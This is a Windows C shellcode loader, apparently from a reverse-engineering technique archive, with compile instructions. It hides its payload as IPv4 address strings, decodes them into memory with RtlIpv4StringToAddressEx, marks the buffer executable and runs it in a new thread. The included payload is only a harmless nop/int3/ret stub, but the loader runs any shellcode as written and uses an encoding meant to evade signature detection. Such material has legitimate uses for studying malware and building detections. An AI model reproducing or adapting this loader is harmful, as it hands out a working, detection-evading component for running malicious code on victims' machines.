/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlIpv4StringToAddressEx
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <ip2string.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib,"ntdll")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    char *      payload []  = { "144.144.204.195" };
    uint32_t    nitem       = 1,
                sitem       = 6;    // IPv4 = 4, port = 2

    uint32_t    idxp, idxr;
    in_addr   * ip4;
    USHORT    * port;
    char      * ptr;
    PCSTR       terminator = "";

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, nitem * sitem, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    ptr = (char*) runtime;
    for (idxp = 0, idxr = 0; idxp < nitem; idxp++, idxr+=sitem)
    {
        ip4  = (in_addr*) &ptr[idxr];
        port = (USHORT*) &ptr[idxr + 4];
        RtlIpv4StringToAddressEx (payload[idxp], FALSE, ip4, port);
    }

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, nitem * sitem, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}